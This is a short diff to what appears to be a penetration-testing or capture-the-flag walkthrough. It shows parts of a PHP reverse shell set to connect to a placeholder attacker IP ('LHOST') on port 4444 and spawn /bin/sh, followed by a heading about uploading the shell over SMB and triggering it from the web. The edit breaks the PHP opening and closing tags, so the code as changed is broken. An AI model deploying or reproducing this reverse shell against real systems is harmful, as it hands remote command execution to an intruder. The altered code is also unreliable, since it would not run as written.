@@ -93,7 +93,7 @@ SECURED :READ, WRITE  Dev
 
 **Reverse Shell**
 ```
-<?php
+<php
 set_time_limit(0);
 $ip = 'LHOST';  // Replace with attacker IP
 $port = 4444;
@@ -105,7 +105,7 @@ $descriptorspec = array(
 );
 $process = proc_open('/bin/sh', $descriptorspec, $pipes);
 proc_close($process);
-?>
+>
 ```
 ### Upload the shell via SMB and trigger it from the web
 ```bash
